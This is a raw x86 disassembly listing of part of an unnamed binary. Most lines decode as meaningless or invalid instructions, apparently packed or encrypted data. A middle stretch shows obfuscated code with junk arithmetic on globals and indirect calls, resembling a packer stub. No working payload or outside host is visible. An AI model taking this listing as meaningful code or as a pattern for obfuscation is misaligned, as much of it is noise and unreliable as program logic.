  417184:	cld    
  417185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417186:	daa    
  417187:	push   esi
  417188:	inc    ebp
  417189:	lods   al,BYTE PTR ds:[esi]
  41718a:	cld    
  41718b:	add    bh,BYTE PTR [edx+esi*4]
  41718e:	xchg   esi,eax
  41718f:	in     al,dx
  417190:	adc    esi,DWORD PTR [ebx]
  417192:	xor    esp,DWORD PTR [ecx+0x45]
  417195:	adc    ebp,DWORD PTR [edx+ebp*4]
  417198:	in     eax,0x52
  41719a:	imul   eax,DWORD PTR [ecx+0x6e733fa7],0xe939a039
  4171a4:	and    eax,DWORD PTR [edi-0x4274bd36]
  4171aa:	xor    eax,0xaa2ae439
  4171af:	jg     0x417169
  4171b1:	test   ebx,0x8e37598f
  4171b7:	push   edi
  4171b8:	jg     0x417190
  4171ba:	cmp    al,0xcb
  4171bc:	or     cl,BYTE PTR [ebp+0x7f]
  4171bf:	xchg   ebp,eax
  4171c0:	push   0x21468499
  4171c5:	aas    
  4171c6:	mov    dh,0x6
  4171c8:	dec    ebp
  4171c9:	test   BYTE PTR [esp+ecx*8-0x2b],dh
  4171cd:	xchg   BYTE PTR [edx+0x201d8d37],al
  4171d3:	adc    al,0xf6
  4171d5:	xchg   ebp,eax
  4171d6:	push   0x7a2b1f61
  4171db:	sub    al,0x47
  4171dd:	or     eax,0x28b53459
  4171e2:	out    0x2d,eax
  4171e4:	add    DWORD PTR [esi-0x7c],edx
  4171e7:	pop    esp
  4171e8:	inc    edi
  4171e9:	jbe    0x4171e4
  4171eb:	bound  edi,QWORD PTR [edi]
  4171ed:	les    esp,FWORD PTR fs:[esi+0xd]
  4171f1:	pop    ss
  4171f2:	xchg   ebp,eax
  4171f3:	xchg   esi,eax
  4171f4:	cmp    eax,0x6a82834e
  4171f9:	frstor [bp+di]
  4171fc:	pop    edx
  4171fd:	popa   
  4171fe:	sub    al,0x6
  417200:	push   esi
  417201:	nop
  417202:	pop    es
  417203:	(bad)  
  417204:	and    DWORD PTR [ebx-0x6a3d9fd3],ebx
  41720a:	or     BYTE PTR [eax-0x471c3ed1],dl
  417210:	dec    ebx
  417211:	cmp    BYTE PTR [edx+esi*4-0x230c2881],0x13
  417219:	ins    DWORD PTR es:[edi],dx
  41721a:	dec    edi
  41721b:	sahf   
  41721c:	mov    al,0xf6
  41721e:	aad    0x63
  417220:	bound  ecx,QWORD PTR [edx-0x62]
  417223:	ins    DWORD PTR es:[edi],dx
  417224:	pushf  
  417225:	xlat   BYTE PTR ds:[ebx]
  417226:	setnp  BYTE PTR [ebx]
  417229:	shl    BYTE PTR [ebx-0x36],1
  41722c:	mov    cl,0x45
  41722e:	xchg   BYTE PTR [eax+eiz*2+0x72],bh
  417232:	out    0x62,al
  417234:	sbb    dh,cl
  417236:	out    0xc7,al
  417238:	fisttp WORD PTR [eax]
  41723a:	sbb    eax,0xb4744111
  41723f:	fisub  WORD PTR [eax+0x4d]
  417242:	dec    edi
  417243:	mov    fs,WORD PTR [edx+0x3]
  417246:	inc    ecx
  417247:	(bad)  [edx]
  417249:	jb     0x417235
  41724b:	(bad)  
  41724c:	and    eax,0x5d9a24b5
  417251:	xchg   edx,eax
  417252:	cwde   
  417253:	fidivr WORD PTR [ebx+0x19]
  417256:	xchg   esi,eax
  417257:	in     al,0xd8
  417259:	fsubr  QWORD PTR ds:0x22be1bab
  41725f:	shl    DWORD PTR [edx+0x5c7cd185],1
  417265:	xor    al,0x89
  417267:	fsubr  DWORD PTR [ebx+0x5c]
  41726a:	inc    edi
  41726b:	popf   
  41726c:	xchg   ecx,eax
  41726d:	in     eax,dx
  41726e:	xor    ecx,esp
  417270:	out    0x97,eax
  417272:	rol    BYTE PTR [edx],cl
  417274:	add    edi,DWORD PTR [eax-0x537ce85]
  41727a:	(bad)  
  41727b:	faddp  st(0),st
  41727d:	jae    0x4172ee
  41727f:	add    eax,DWORD PTR [edx+0x74]
  417282:	leave  
  417283:	push   edx
  417284:	fs daa 
  417286:	jne    0x41726e
  417288:	jge    0x417281
  41728a:	bound  ebp,QWORD PTR [ecx+0x55b7e38a]
  417290:	cld    
  417291:	sub    al,0xd4
  417293:	inc    esi
  417294:	scas   eax,DWORD PTR es:[edi]
  417295:	daa    
  417296:	dec    esp
  417297:	adc    al,0xc2
  417299:	aaa    
  41729a:	in     eax,dx
  41729b:	scas   eax,DWORD PTR es:[edi]
  41729c:	xchg   DWORD PTR [ecx+0x11d98eea],esp
  4172a2:	mov    bl,0x75
  4172a4:	jno    0x4172db
  4172a6:	rol    DWORD PTR [edi-0x4bc339f9],0x15
  4172ad:	(bad)  
  4172ae:	out    dx,al
  4172af:	xchg   ecx,eax
  4172b0:	fidiv  WORD PTR [ebp+0x24]
  4172b3:	(bad)  
  4172b4:	in     eax,0x2d
  4172b6:	xchg   edx,eax
  4172b7:	or     bl,BYTE PTR [eax+0x3120d6f8]
  4172bd:	push   ds
  4172be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172bf:	jb     0x9e19fe89
  4172c5:	popa   
  4172c6:	inc    ecx
  4172c7:	inc    BYTE PTR [edx+0x42]
  4172ca:	mov    ?,WORD PTR [edx]
  4172cc:	(bad)  
  4172cd:	mov    edx,0x1a8af798
  4172d2:	adc    DWORD PTR [ecx-0x75],0x394c869d
  4172d9:	out    0xb1,al
  4172db:	test   BYTE PTR [eax+0x14],0x9e
  4172df:	sub    ecx,esi
  4172e1:	pop    ebp
  4172e2:	in     eax,dx
  4172e3:	inc    ebx
  4172e4:	jbe    0x417279
  4172e6:	or     BYTE PTR [ecx-0x3e557a11],ch
  4172ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172ed:	ja     0x417311
  4172ef:	stos   BYTE PTR es:[edi],al
  4172f0:	inc    esi
  4172f1:	xchg   esp,eax
  4172f2:	mov    bh,0x88
  4172f4:	imul   edi,DWORD PTR cs:[ebx-0x6d],0xffffffe9
  4172f9:	pop    esi
  4172fa:	add    bl,BYTE PTR [ebp+edi*8-0x14]
  4172fe:	mov    BYTE PTR [eax+edx*1-0x7bf53c95],0xc1
  417306:	adc    eax,eax
  417308:	xor    ebx,DWORD PTR [edi+0x7e]
  41730b:	adc    edi,0x598b96b9
  417311:	(bad)  
  417313:	push   ss
  417314:	inc    edx
  417315:	shr    DWORD PTR [ebp-0x79812f66],cl
  41731b:	or     eax,0x4c8977ea
  417320:	mov    edx,0x90259b1f
  417325:	sbb    al,bh
  417327:	arpl   WORD PTR [edi+0x27ecd5ce],bp
  41732d:	sub    eax,0x99241f90
  417332:	cs aam 0x32
  417335:	(bad)  
  417336:	iret   
  417337:	cmp    esi,DWORD PTR [edi-0x3f8ef32]
  41733d:	(bad)  
  41733e:	and    DWORD PTR [edi-0x1031cb88],esi
  417344:	aad    0xcc
  417346:	pop    DWORD PTR [ecx+0x6fa3e2e2]
  41734c:	cmp    DWORD PTR [ebp-0x74],esp
  41734f:	lea    eax,[esp+0x44]
  417353:	mov    DWORD PTR [esp+0xc],eax
  417357:	cmp    DWORD PTR ds:0x42832d,0x0
  41735e:	mov    DWORD PTR ds:0x428471,edi
  417364:	mov    ecx,0x653d
  417369:	jmp    0x417446
  41736e:	mov    DWORD PTR ds:0x428415,0x6fab
  417378:	mov    DWORD PTR ds:0x428409,0x3325
  417382:	cmp    DWORD PTR ds:0x42832d,0x0
  417389:	jl     0x4173a7
  41738f:	push   DWORD PTR [ebp-0x20]
  417392:	push   DWORD PTR [ebp-0xc]
  417395:	call   DWORD PTR ds:0x42e0ec
  41739b:	xor    edi,0x628b
  4173a1:	or     edi,0x2ad9
  4173a7:	and    DWORD PTR ds:0x42855d,edx
  4173ad:	and    ecx,DWORD PTR ds:0x428579
  4173b3:	xor    edi,edi
  4173b5:	add    edi,DWORD PTR ds:0x4284ad
  4173bb:	mov    edx,DWORD PTR ds:0x4285a5
  4173c1:	sub    edi,edx
  4173c3:	or     edi,DWORD PTR [edi+edx*1]
  4173c6:	inc    edx
  4173c7:	cmp    DWORD PTR ds:0x428355,0x0
  4173ce:	mov    DWORD PTR ds:0x428479,0x322b
  4173d8:	mov    DWORD PTR ds:0x428375,0x622c
  4173e2:	mov    edx,DWORD PTR ds:0x428345
  4173e8:	mov    DWORD PTR ds:0x4284cd,0x673b
  4173f2:	jmp    0x417446
  4173f7:	mov    DWORD PTR ds:0x42834d,edx
  4173fd:	cmp    DWORD PTR ds:0x428355,0x0
  417404:	jl     0x41742c
  41740a:	push   DWORD PTR [ebp-0x24]
  41740d:	push   0x428243
  417412:	call   DWORD PTR ds:0x42e27c
  417418:	sbb    DWORD PTR ds:0x428351,0x4806
  417422:	add    DWORD PTR ds:0x4284e1,0x48d6
  41742c:	add    edi,0x263
  417432:	xor    DWORD PTR ds:0x428359,0x2f2b
  41743c:	add    DWORD PTR ds:0x428581,0x7768
  417446:	lea    eax,[esp+0x60]
  41744a:	xor    ecx,ecx
  41744c:	or     ecx,DWORD PTR ds:0x42833d
  417452:	xor    DWORD PTR ds:0x428359,ecx
  417458:	mov    DWORD PTR [esp+0x10],eax
  41745c:	sub    edi,DWORD PTR ds:0x4284fd
  417462:	mov    eax,ds:0x422708
  417467:	sbb    DWORD PTR ds:0x428479,edx
  41746d:	mov    eax,DWORD PTR [eax+0x1d8]
  417473:	cmp    DWORD PTR ds:0x42847d,0x0
  41747a:	mov    edi,0x142d
  41747f:	mov    DWORD PTR ds:0x42836d,edi
  417485:	jmp    0x4174dd
  41748a:	not    ecx
  41748c:	cmp    DWORD PTR ds:0x42847d,0x0
  417493:	jg     0x4174bb
  417499:	push   DWORD PTR [ebp-0x1c]
  41749c:	push   0x483b
  4174a1:	call   DWORD PTR ds:0x42e0f0
  4174a7:	and    DWORD PTR ds:0x4284ed,0x19ab
  4174b1:	xor    DWORD PTR ds:0x428341,0x742c
  4174bb:	add    edx,DWORD PTR ds:0x428559
  4174c1:	sub    DWORD PTR ds:0x428469,0x7d91
  4174cb:	mov    edx,DWORD PTR ds:0x42841d
  4174d1:	or     DWORD PTR ds:0x4284e5,edx
  4174d7:	adc    DWORD PTR ds:0x4284f1,ecx
  4174dd:	mov    eax,DWORD PTR [eax]
  4174df:	mov    edi,DWORD PTR ds:0x428515
  4174e5:	mov    ecx,DWORD PTR ds:0x428591
  4174eb:	sub    ecx,edi
  4174ed:	or     edi,DWORD PTR [edi+ecx*1]
  4174f0:	mov    ecx,eax
  4174f2:	xor    ecx,0xa5069baf
  4174f8:	xor    edx,edx
  4174fa:	or     edx,DWORD PTR ds:0x428449
  417500:	sub    edx,DWORD PTR ds:0x42846d
  417506:	mov    DWORD PTR ds:0x428449,edx
  41750c:	xor    eax,0xfffffffe
  41750f:	shl    eax,0x1e
  417512:	and    DWORD PTR ds:0x428339,edi
  417518:	shr    ecx,0x2
  41751b:	or     ecx,eax
  41751d:	mov    eax,DWORD PTR [esp+0x10]
  417521:	inc    edx
  417522:	mov    DWORD PTR [eax],ecx
  417524:	xor    edx,edi
  417526:	mov    edi,0xcb79b566
  41752b:	mov    DWORD PTR [esp+0x80],edi
  417532:	mov    DWORD PTR [esp+0x84],esi
  417539:	cmp    DWORD PTR ds:0x428415,0x0
  417540:	movzx  ecx,WORD PTR ds:0x428345
  417547:	movzx  ecx,BYTE PTR ds:0x428439
  41754e:	jmp    0x4175bc
  417553:	not    edx
  417555:	cmp    DWORD PTR ds:0x428415,0x0
  41755c:	jb     0x4175ae
  417562:	push   DWORD PTR [ebp-0x20]
  417565:	push   0x1e74
  41756a:	push   0x10b8
  41756f:	push   0x6d55
  417574:	push   DWORD PTR [ebp-0x18]
  417577:	push   DWORD PTR [ebp-0x1c]
  41757a:	call   DWORD PTR ds:0x42e0f4
  417580:	movzx  edx,BYTE PTR ds:0x428581
  417587:	add    edx,DWORD PTR ds:0x4284e9
  41758d:	mov    DWORD PTR ds:0x428581,edx
  417593:	xor    ecx,ecx
  417595:	xor    ecx,DWORD PTR ds:0x4283b9
  41759b:	xor    edx,edx
  41759d:	xor    edx,DWORD PTR ds:0x428531
  4175a3:	sub    ecx,edx
  4175a5:	sub    ecx,DWORD PTR [ecx+edx*1]
  4175a8:	add    DWORD PTR ds:0x42836d,edx
  4175ae:	xor    DWORD PTR ds:0x428569,ebx
  4175b4:	sbb    DWORD PTR ds:0x428405,edx
  4175ba:	adc    edx,ecx
  4175bc:	mov    eax,DWORD PTR [esp+0x80]
  4175c3:	or     edx,edx
  4175c5:	mov    ecx,DWORD PTR [esp+0x84]
  4175cc:	cmp    DWORD PTR ds:0x428479,0x0
  4175d3:	mov    edx,DWORD PTR ds:0x42847d
  4175d9:	mov    DWORD PTR ds:0x428349,0x64c4
  4175e3:	mov    edx,DWORD PTR ds:0x42840d
  4175e9:	jmp    0x417644
  4175ee:	mov    DWORD PTR ds:0x428431,0x1a08
  4175f8:	cmp    DWORD PTR ds:0x428479,0x0
  4175ff:	ja     0x417624
  417605:	push   DWORD PTR [ebp-0x1c]
  417608:	call   DWORD PTR ds:0x42e280
  41760e:	sbb    edx,DWORD PTR ds:0x428351
  417614:	adc    DWORD PTR ds:0x42841d,0x1011
  41761e:	sbb    DWORD PTR ds:0x4284d5,ebx
  417624:	xor    edx,edx
  417626:	or     edx,DWORD PTR ds:0x428405
  41762c:	xor    DWORD PTR ds:0x42854d,edx
  417632:	add    DWORD PTR ds:0x42840d,ebx
  417638:	add    edx,0x156e
  41763e:	sub    edx,0x437f
  417644:	shrd   eax,ecx,0x2
  417648:	cmp    DWORD PTR ds:0x428501,0x0
  41764f:	mov    edx,0x364f
  417654:	mov    DWORD PTR ds:0x4284f5,0x205c
  41765e:	mov    edx,0xb6f
  417663:	jmp    0x4176bb
  417668:	mov    edx,DWORD PTR ds:0x428545
  41766e:	mov    DWORD PTR ds:0x428371,edi
  417674:	cmp    DWORD PTR ds:0x428501,0x0
  41767b:	jae    0x4176a7
  417681:	push   DWORD PTR [ebp-0x18]
  417684:	call   DWORD PTR ds:0x42e0f8
  41768a:	sub    DWORD PTR ds:0x428449,0x4a16
  417694:	mov    edx,DWORD PTR ds:0x428581
  41769a:	or     DWORD PTR ds:0x428565,edx
  4176a0:	sub    DWORD PTR ds:0x42854d,ecx
  4176a6:	dec    edx
  4176a7:	dec    edx
  4176a8:	not    DWORD PTR ds:0x428331
  4176ae:	movzx  edx,WORD PTR ds:0x428545
  4176b5:	sub    DWORD PTR ds:0x4284fd,edx
  4176bb:	shr    ecx,0x2
  4176be:	mov    ecx,DWORD PTR [esp+0x80]
  4176c5:	mov    edx,DWORD PTR [esp+0x84]
  4176cc:	add    DWORD PTR ds:0x428335,0x428361
  4176d6:	xor    eax,0x32de6d5d
  4176db:	adc    DWORD PTR ds:0x428365,0x4c3b
  4176e5:	xor    edx,edx
  4176e7:	or     DWORD PTR ds:0x4284dd,0x428351
  4176f1:	or     edx,eax
  4176f3:	mov    eax,ds:0x428465
  4176f8:	adc    DWORD PTR ds:0x428571,eax
  4176fe:	mov    eax,ds:0x422708
  417703:	or     DWORD PTR ds:0x42840d,0x428441
  41770d:	push   edx
  41770e:	or     DWORD PTR ds:0x428425,0x3421
  417718:	push   DWORD PTR [eax+0x19c]
  41771e:	lea    eax,[esp+0x80]
  417725:	push   eax
  417726:	sbb    DWORD PTR ds:0x428351,0x428465
  417730:	shl    ecx,0x1e
  417733:	call   0x411c08
  417738:	or     DWORD PTR ds:0x42840d,0x889
  417742:	lea    eax,[ebp+0x10]
  417745:	add    DWORD PTR ds:0x428435,0x428371
  41774f:	push   eax
  417750:	or     DWORD PTR ds:0x428411,0x378
  41775a:	mov    DWORD PTR [esp+0x14],edi
  41775e:	mov    DWORD PTR [esp+0x18],esi
  417762:	add    DWORD PTR ds:0x42856d,0x1c44
  41776c:	lea    eax,[ebp+0xc]
  41776f:	sbb    DWORD PTR ds:0x428565,0x6a60
  417779:	push   eax
  41777a:	adc    DWORD PTR ds:0x428481,0x65f7
  417784:	mov    DWORD PTR [esp+0x18],edi
  417788:	lea    eax,[ebp+0x8]
  41778b:	mov    DWORD PTR [esp+0x1c],esi
  41778f:	sub    DWORD PTR ds:0x428479,0x37c8
  417799:	jmp    0x4179f6
  41779e:	cmp    edx,eax
  4177a0:	retf   
  4177a1:	mov    esp,0x44b9bc3c
  4177a6:	out    0x8d,eax
  4177a8:	push   es
  4177a9:	xchg   edx,eax
  4177aa:	mov    dl,0x6
  4177ac:	or     bh,0xfb
  4177af:	faddp  st(0),st
  4177b1:	mov    esi,0xbebec235
  4177b6:	inc    ebp
  4177b7:	(bad)  
  4177b8:	mov    ebp,0xe001abc1
  4177bd:	or     DWORD PTR [esi],esp
  4177bf:	repz push 0x4b4858bf
  4177c5:	mov    gs,WORD PTR [esi-0xb0ede6c]
  4177cb:	jp     0x417804
  4177cd:	mov    bl,0x6a
  4177cf:	xchg   esp,eax
  4177d0:	imul   eax,edi,0x9ac02a9b
  4177d6:	fadd   DWORD PTR [ebp+0x576174fe]
  4177dc:	cmp    ebx,DWORD PTR [edi-0xc]
  4177df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177e0:	jns    0x41785d
  4177e2:	(bad)  
  4177e3:	cmp    BYTE PTR [esi-0x2743d4e7],bh
  4177e9:	test   al,0x26
  4177eb:	mov    eax,0x51339119
  4177f0:	ret    0xc020
  4177f3:	fadd   QWORD PTR [esi-0x9387c9f]
  4177f9:	aad    0xf9
  4177fb:	out    0x3b,eax
  4177fd:	xor    al,0xc
  4177ff:	shl    BYTE PTR [esi+0x3bc8ca3b],cl
  417805:	mov    cs,esi
  417807:	xor    ebx,DWORD PTR [eax+edi*2-0x5c]
  41780b:	jp     0x4177e7
  41780d:	adc    esi,DWORD PTR [esi+eiz*1-0x11]
  417811:	aam    0x76
  417813:	inc    edi
  417814:	pop    ebp
  417815:	cmp    al,0x86
  417817:	pop    ecx
  417818:	push   es
  417819:	repz nop DWORD PTR [ebp-0x65acb7ab]
  417821:	jmp    0x41780d
  417823:	or     esi,DWORD PTR [eax+ebp*2+0x66]
  417827:	scas   al,BYTE PTR es:[edi]
  417828:	pop    ecx
  417829:	mov    dl,0x88
  41782b:	xchg   ebp,eax
  41782c:	into   
  41782d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41782e:	push   0xffffffae
  417830:	adc    al,0x5d
  417832:	mov    bl,bh
  417834:	xor    eax,0x24d6ddfc
  417839:	inc    BYTE PTR [edi-0x58977955]
  41783f:	loope  0x417857
  417841:	mov    WORD PTR [ebx+0x22a61833],ds
  417847:	call   0xdbb:0xa3143b8f
  41784e:	adc    al,0x18
  417850:	int3   
  417851:	out    dx,al
  417852:	pop    edx
  417853:	jne    0x417879
  417855:	or     BYTE PTR [ebx+ebx*2+0x1c],dl
  417859:	pop    es
  41785a:	repz jl 0x417866
  41785d:	das    
  41785e:	mov    eax,ds:0x17aefabf
  417863:	mov    ebp,0xd0502ff6
  417868:	mov    edi,0xc2d404eb
  41786d:	icebp  
  41786e:	pop    ebx
  41786f:	jg     0x417816
  417871:	sbb    bl,BYTE PTR [ebx+0x17]
  417874:	enter  0x660c,0xaa
  417878:	add    al,0xc1
  41787a:	cmp    BYTE PTR [edx],bh
  41787c:	data16 aaa 
  41787e:	test   BYTE PTR [ebx+0x741e3bc4],bl
  417884:	inc    edx
  417885:	xchg   edx,eax
  417886:	retf   
  417887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417888:	sub    DWORD PTR [ebx],ecx
  41788a:	stos   DWORD PTR es:[edi],eax
  41788b:	xlat   BYTE PTR ds:[ebx]
  41788c:	enter  0x2001,0x98
  417890:	xchg   ebp,eax
  417891:	rol    DWORD PTR [edi],0x88
  417894:	scas   al,BYTE PTR es:[edi]
  417895:	mov    ah,0x76
  417897:	lods   al,BYTE PTR gs:[esi]
  417899:	cmp    ah,bh
  41789b:	in     al,dx
  41789c:	fwait
  41789d:	mov    bl,0x6f
  41789f:	mov    ebp,0x10659b5
  4178a4:	and    dl,dl
  4178a6:	shr    DWORD PTR [esi-0x4e03d874],0x8d
  4178ad:	push   esp
  4178ae:	ds dec ecx
  4178b0:	out    0x57,eax
  4178b2:	mov    esp,edx
  4178b4:	pop    esp
  4178b5:	rol    BYTE PTR [eax-0x2b],cl
  4178b8:	inc    eax
  4178b9:	gs jmp 0x8f4a170d
  4178bf:	repz sbb eax,0x5370165c
  4178c5:	push   eax
  4178c6:	mov    ds:0xf0bf0f70,al
  4178cb:	cli    
  4178cc:	adc    DWORD PTR ds:[edi],edx
  4178cf:	adc    ecx,DWORD PTR [esi+0x4c742325]
  4178d5:	mov    BYTE PTR [eax-0x67500b5c],ch
  4178db:	or     ecx,ecx
  4178dd:	xchg   ebx,eax
  4178de:	in     al,0x49
  4178e0:	ret    0x97b5
  4178e3:	outs   dx,DWORD PTR ds:[esi]
  4178e4:	repz sbb al,ch
  4178e7:	mov    ah,0x49
  4178e9:	or     esi,DWORD PTR [eax-0x770cc373]
  4178ef:	rcr    DWORD PTR [ebx+0x60],cl
  4178f2:	scas   eax,DWORD PTR es:[edi]
  4178f3:	add    al,0x74
  4178f5:	ja     0x4178cc
  4178f7:	pop    esp
  4178f8:	xchg   BYTE PTR gs:[ebx+0x586846d5],bl
  4178ff:	stc    
  417900:	fdivr  QWORD PTR [ebx]
  417902:	inc    ebx
  417903:	jge    0x417899
  417905:	mov    ebx,0x7ce28026
  41790a:	ror    edi,1
  41790c:	mov    bl,dl
  41790e:	pop    ss
  41790f:	push   edi
  417910:	adc    al,0x4a
  417912:	ja     0x4178f2
  417914:	lock pop ecx
  417916:	pop    edi
  417917:	push   edx
  417918:	inc    ebx
  417919:	mov    esp,0xaf3732cf
  41791e:	stos   BYTE PTR es:[edi],al
  41791f:	xor    al,0x68
  417921:	or     eax,0x53afb42a
  417926:	inc    DWORD PTR [esi+0x36]
  417929:	mov    ecx,0xc809fd71
  41792e:	loop   0x4179a4
  417930:	pop    ebp
  417931:	jne    0x41791b
  417933:	sub    al,0xcd
  417935:	jne    0x4178e6
  417937:	test   al,0x70
  417939:	sub    cl,BYTE PTR [ebx]
  41793b:	leave  
  41793c:	sar    DWORD PTR [edi-0x16],cl
  41793f:	mov    edi,0x19950d70
  417944:	jg     0x4178e9
  417946:	lock pop edx
  417948:	jb     0x4178d7
  41794a:	sbb    eax,0xbe30cc6f
  41794f:	add    BYTE PTR [edi-0x71],0x31
  417953:	jge    0x4179ca
  417955:	push   edi
  417956:	mov    BYTE PTR [ebp-0x30aab0e0],bh
  41795c:	test   eax,0x9539587
  417961:	pop    ebp
  417962:	xchg   esp,eax
  417963:	sub    BYTE PTR [edx-0x19],ah
  417966:	fisttp WORD PTR [bp+si+0x77]
  41796a:	mov    ah,0x0
  41796c:	xor    BYTE PTR [edx],ch
  41796e:	mov    ah,0xfa
  417970:	xchg   edi,eax
  417971:	xchg   ebp,eax
  417972:	out    0x50,al
  417974:	out    0x2e,al
  417976:	(bad)  
  417977:	call   0x7ca04559
  41797c:	and    eax,0x8ce16ad1
  417981:	jae    0x417971
  417983:	and    ebp,DWORD PTR ds:0xe893ee96
  417989:	mov    cl,0x7f
  41798b:	jecxz  0x417a08
  41798d:	mov    ah,BYTE PTR [edi-0x47]
  417990:	xchg   BYTE PTR [edx-0x77e98d34],ah
  417996:	xor    eax,0x7f771629
  41799b:	jae    0x417932
  41799d:	mov    ch,0x6f
  41799f:	cld    
  4179a0:	push   edi
  4179a1:	cdq    
  4179a2:	sbb    al,0x17
  4179a4:	xchg   edx,eax
  4179a5:	xchg   edx,eax
  4179a6:	inc    esp
  4179a7:	fimul  DWORD PTR [edi]
  4179a9:	xor    BYTE PTR [edi],0x39
  4179ac:	test   esi,ebp
  4179ae:	in     al,0xda
  4179b0:	push   cs
  4179b1:	mov    ds:0xf1ed868b,eax
  4179b6:	inc    eax
  4179b7:	repz xor eax,0x915ac316
  4179bd:	stos   DWORD PTR es:[edi],eax
  4179be:	xchg   edx,eax
  4179bf:	mov    ds:0xeafcd5fc,al
  4179c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179c5:	pop    ds
  4179c6:	call   0x559b:0x10ee0a0d
  4179cd:	adc    DWORD PTR [ecx],ecx
  4179cf:	mov    bl,BYTE PTR [ebx+esi*1]
  4179d2:	sti    
  4179d3:	mov    bh,0x99
  4179d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179d6:	imul   esi,DWORD PTR [ebx-0x7225d3b4],0x36
  4179dd:	xor    eax,0x3c3bd998
  4179e2:	xchg   edx,eax
  4179e3:	and    eax,0xac5c7214
  4179e8:	popf   
  4179e9:	rol    BYTE PTR [esi+0x74],0x57
  4179ed:	xchg   DWORD PTR ss:[eax-0x5f22dcf9],edx
  4179f4:	ret    
  4179f5:	jb     0x417980
  4179f7:	jl     0x417a1d
  4179f9:	sbb    BYTE PTR [ecx+0x4284d915],al
  4179ff:	add    BYTE PTR [ebp-0x7d],ch
  417a02:	inc    edx
  417a03:	add    cl,ch
  417a05:	pop    eax
  417a06:	add    al,BYTE PTR [eax]
  417a08:	add    BYTE PTR [eax],ah
  417a0a:	add    ebp,ebx
  417a0c:	xchg   ecx,eax
  417a0d:	jecxz  0x4179c1
  417a0f:	mov    ah,0xb4
  417a11:	jb     0x417a54
  417a13:	sahf   
  417a14:	nop
  417a15:	mov    ch,0x8a
  417a17:	and    bl,BYTE PTR [esi-0x413f1d8d]
  417a1d:	xor    eax,0x77bebec2
  417a22:	retf   0x8b58
  417a25:	lods   eax,DWORD PTR ds:[esi]
  417a26:	repnz inc ebx
  417a28:	jge    0x417a39
  417a2a:	push   edx
  417a2b:	rol    BYTE PTR [edi+edx*1+0x5d],1
  417a2f:	repz push 0xffffff85
  417a32:	mov    ch,0xa
  417a34:	cmp    BYTE PTR [edx+ebx*1+0x15bb7006],bl
  417a3b:	adc    eax,0x61b02146
  417a40:	mov    BYTE PTR [ecx+0x7662c16f],dh
  417a46:	dec    ecx
  417a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a48:	xor    cl,ah
  417a4a:	mov    DWORD PTR [ebp+0x6d],ebp
  417a4d:	mov    ?,WORD PTR [edi+eiz*2]
  417a50:	xchg   cx,ax
  417a52:	(bad)  
  417a54:	clc    
  417a55:	sub    eax,0x1596e5c2
  417a5a:	or     eax,0xfb25191f
  417a5f:	enter  0xff9c,0x1c
  417a63:	and    BYTE PTR [ebx+0x2f],ch
  417a66:	mov    ds:0xc34eaf65,eax
  417a6b:	stos   DWORD PTR es:[edi],eax
  417a6c:	(bad)  
  417a6d:	xchg   ecx,eax
  417a6e:	scas   al,BYTE PTR es:[edi]
  417a6f:	cmp    al,0x7
  417a71:	cmp    cl,dl
  417a73:	push   edx
  417a74:	es cld 
  417a76:	fidiv  WORD PTR [edi+0x60]
  417a79:	xor    eax,0xa3c82fc4
  417a7e:	call   0x89b12513
  417a83:	sbb    dh,BYTE PTR [ebp+0x52]
  417a86:	jae    0x417a6f
  417a88:	into   
  417a89:	shr    eax,1
  417a8b:	add    BYTE PTR [ecx],dl
  417a8d:	pop    esi
  417a8e:	sub    DWORD PTR [ecx+0x45],esp
  417a91:	mov    eax,ds:0xa0df6031
  417a96:	xor    eax,0xab03fc2f
  417a9b:	sbb    BYTE PTR [esi],ch
  417a9d:	ret    
  417a9e:	add    DWORD PTR [edi-0x74474f2d],ebx
  417aa4:	jmp    0x3e57:0xe2792158
  417aab:	call   0x1164b817
  417ab0:	rcl    BYTE PTR [edx-0x29],1
  417ab3:	mov    gs,ecx
  417ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ab6:	cs cs cli 
  417ab9:	pop    ebx
  417aba:	mov    edx,0xf4b47362
  417abf:	imul   ebp,DWORD PTR [ebp-0x16],0xd7113b8e
  417ac6:	xchg   ebp,eax
  417ac7:	mov    ch,0x49
  417ac9:	cwde   
  417aca:	or     al,0x97
  417acd:	xchg   ebx,edi
  417acf:	mov    al,0xf9
  417ad1:	push   edi
  417ad2:	dec    ebp
  417ad3:	mov    DWORD PTR [eax+0x4d],esp
  417ad6:	scas   al,BYTE PTR es:[edi]
  417ad7:	fsincos 
  417ad9:	push   0x8834344f
  417ade:	xchg   esp,eax
  417adf:	push   es
  417ae0:	sub    eax,0x4d26f7bb
  417ae5:	jns    0x417ab4
  417ae7:	jg     0x417ace
  417ae9:	rcr    ch,0x60
  417aec:	mov    ds:0xdb0f9104,eax
  417af1:	outs   dx,DWORD PTR ds:[esi]
  417af2:	cmp    ebx,DWORD PTR [esi+eax*8-0x3d291f76]
  417af9:	xlat   BYTE PTR ds:[ebx]
  417afa:	xchg   ecx,eax
  417afb:	shl    BYTE PTR ds:0xd8677456,0xc0
  417b02:	push   cs
  417b03:	jae    0x417ae8
  417b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b06:	adc    edx,ebp
  417b08:	dec    edi
  417b09:	xchg   esi,eax
  417b0a:	adc    al,0xff
  417b0c:	mov    WORD PTR [edi+0x4a574946],fs
  417b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b13:	sbb    edx,DWORD PTR [edi+ebp*1+0x235e612]
  417b1a:	jp     0x417b97
  417b1c:	mov    ebx,edi
  417b1e:	fisub  WORD PTR [esi+ebp*4]
  417b21:	rcr    al,cl
  417b23:	push   edi
  417b24:	aaa    
  417b25:	pop    edx
  417b26:	icebp  
  417b27:	jne    0x417adf
  417b29:	(bad)  
  417b2a:	clc    
  417b2b:	mov    ecx,0x9ea1ba2a
  417b30:	stos   BYTE PTR es:[edi],al
  417b31:	cs scas al,BYTE PTR es:[edi]
  417b33:	lods   al,BYTE PTR ds:[esi]
